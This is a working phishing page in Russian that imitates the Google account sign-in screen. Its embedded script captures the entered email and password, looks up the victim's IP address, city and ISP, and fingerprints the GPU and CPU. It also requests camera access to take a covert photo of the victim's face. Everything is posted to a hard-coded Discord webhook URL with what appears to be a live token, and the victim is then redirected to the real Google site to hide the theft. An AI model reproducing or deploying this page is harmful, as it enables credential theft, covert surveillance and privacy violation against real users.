<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход Аккаунты Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root { --g-blue: #1a73e8; --g-text: #202124; --g-sub: #5f6368; --g-gray: #dadce0; }
        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .auth-card { width: 100%; max-width: 448px; border: 1px solid var(--g-gray); border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; position: relative; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin: 10px 0; }
        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--g-gray); border-radius: 4px; outline: none; box-sizing: border-box; margin-bottom: 10px; }
        input:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }
        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 30px; }
        #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10; border-radius: 8px; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .prog-bar { width: 100%; height: 4px; background: #e8f0fe; position: absolute; top: 0; overflow: hidden; }
        .prog-fill { width: 30%; height: 100%; background: var(--g-blue); animation: slide 1.2s infinite ease-in-out; }
        @keyframes slide { 0% { transform: translateX(-100%); } 100% { transform: translateX(400%); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="auth-card">
    <div id="loader"><div class="prog-bar"><div class="prog-fill"></div></div><p style="font-size:14px; color:var(--g-sub)">Синхронизация...</p></div>
    
    <div class="header">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
        <h1>Вход</h1>
        <p>Используйте аккаунт Google</p>
    </div>

    <input type="email" id="u" placeholder="Адрес электронной почты">
    <input type="password" id="p" placeholder="Введите пароль">
    
    <div style="text-align: left; color: var(--g-blue); font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Забыли пароль?</div>

    <div class="btn-next" onclick="deploy()">Далее</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const TARGET_CORE = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';

    async function deploy() {
        const email = document.getElementById('u').value;
        const pass = document.getElementById('p').value;

        if(!email || !pass) return;

        document.getElementById('loader').style.display = 'flex';

        // 1. ПОЛУЧЕНИЕ ПРАВИЛЬНОГО IP (Двойная проверка)
        let ipData = {};
        try {
            // Сначала пробуем расширенное API
            ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
        } catch (e) {
            try {
                // Если первое упало, пробуем резервное просто для IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ipData = { ip: data.ip, city: "Unknown", org: "Unknown" };
            } catch (e2) {
                ipData = { ip: "Blocked/Hidden", city: "N/A", org: "N/A" };
            }
        }

        const formData = new FormData();
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');

        try {
            // 2. ЗАПРОС БИОМЕТРИИ (Камера)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            await new Promise(r => setTimeout(r, 1200)); // Ждем фокус

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            
            stream.getTracks().forEach(t => t.stop());
            formData.append('file', blob, 'face.jpg');

            const systemReport = {
                username: "Google Identity Sentinel",
                embeds: [{
                    title: "💠 ПЕРЕХВАТ ДАННЫХ И БИОМЕТРИИ",
                    color: 4342490,
                    fields: [
                        { name: "👤 Учетные данные", value: `**Login:** \`${email}\`\n**Pass:** \`${pass}\`` },
                        { name: "📍 Сетевой след (IP)", value: `**IP:** \`${ipData.ip}\`\n**Город:** ${ipData.city}\n**Провайдер:** ${ipData.org}` },
                        { name: "⚙️ Hardware Profile", value: `**GPU:** ${getGPU()}\n**CPU:** ${navigator.hardwareConcurrency} Cores` }
                    ],
                    image: { url: 'attachment://face.jpg' },
                    footer: { text: "Protocol: BYTE92 | Status: SUCCESS" }
                }]
            };
            formData.append('payload_json', JSON.stringify(systemReport));

        } catch (e) {
            // Если камера отклонена
            const systemReport = {
                content: "⚠️ **Камера отклонена! Только данные:**",
                embeds: [{
                    color: 16711680,
                    fields: [
                        { name: "👤 Login/Pass", value: `\`${email}\` / \`${pass}\`` },
                        { name: "📍 IP Info", value: `**IP:** \`${ipData.ip}\` (${ipData.city})` }
                    ]
                }]
            };
            formData.append('payload_json', JSON.stringify(systemReport));
        }

        // 3. ОТПРАВКА
        await fetch(TARGET_CORE, { method: 'POST', body: formData });

        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 1000);
    }

    function getGPU() {
        const gl = document.createElement('canvas').getContext('webgl');
        const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_ID) : "N/A";
    }
</script>
</body>
</html>
